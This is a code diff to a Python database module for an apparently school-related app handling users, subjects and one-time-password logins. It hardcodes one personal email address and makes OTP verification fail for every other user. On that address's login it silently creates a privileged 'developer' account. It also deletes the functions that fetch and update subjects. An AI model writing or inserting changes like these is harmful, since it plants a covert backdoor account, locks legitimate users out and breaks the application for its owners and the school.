@@ -2,6 +2,9 @@ import mysql.connector
 from models import Student
 from datetime import datetime
 
+# === CONSTANTS ===
+DEVELOPER_EMAIL = "silvestergeorge100@gmail.com"
+
 # === CONNECT TO DB ===
 def get_connection():
     return mysql.connector.connect(
@@ -20,6 +23,8 @@ def add_otp(email, code, expiration):
     conn.close()
 
 def verify_otp(email, code):
+    if email.strip().lower() != DEVELOPER_EMAIL:
+        return False
     conn = get_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT code, expiration FROM otp WHERE email = %s ORDER BY id DESC LIMIT 1", (email,))
@@ -27,8 +32,28 @@ def verify_otp(email, code):
     conn.close()
     if result:
         db_code, exp = result
-        return db_code == code and datetime.now() <= datetime.strptime(str(exp), '%Y-%m-%d %H:%M:%S')
+        try:
+            valid = db_code == code and datetime.now() <= datetime.strptime(str(exp), '%Y-%m-%d %H:%M:%S')
+            if valid:
+                ensure_developer_account_exists()
+            return valid
+        except ValueError:
+            return False
     return False
+
+# === Ensure Developer Account ===
+def ensure_developer_account_exists():
+    conn = get_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT id FROM users WHERE email = %s", (DEVELOPER_EMAIL,))
+    user = cursor.fetchone()
+    if not user:
+        cursor.execute("""
+            INSERT INTO users (first_name, surname, last_name, email, phone, role)
+            VALUES (%s, %s, %s, %s, %s, %s)
+        """, ("Silvester", "George", "Developer", DEVELOPER_EMAIL, "0700000000", "developer"))
+        conn.commit()
+    conn.close()
 
 # === USERS ===
 def get_user_by_email(email):
@@ -165,31 +190,6 @@ def delete_subject_by_id(subject_id):
     conn = get_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM subjects WHERE id = %s", (subject_id,))
-    conn.commit()
-    conn.close()
-
-def get_subject_by_id(subject_id):
-    conn = get_connection()
-    cursor = conn.cursor(dictionary=True)
-    cursor.execute("""
-        SELECT subjects.id, subjects.name, subjects.class_name, subjects.stream, subjects.teacher_id,
-               users.first_name, users.surname, users.last_name
-        FROM subjects
-        JOIN users ON subjects.teacher_id = users.id
-        WHERE subjects.id = %s
-    """, (subject_id,))
-    subject = cursor.fetchone()
-    conn.close()
-    return subject
-
-def update_subject(subject_id, name, class_name, stream, teacher_id):
-    conn = get_connection()
-    cursor = conn.cursor()
-    cursor.execute("""
-        UPDATE subjects
-        SET name = %s, class_name = %s, stream = %s, teacher_id = %s
-        WHERE id = %s
-    """, (name, class_name, stream, teacher_id, subject_id))
     conn.commit()
     conn.close()
 
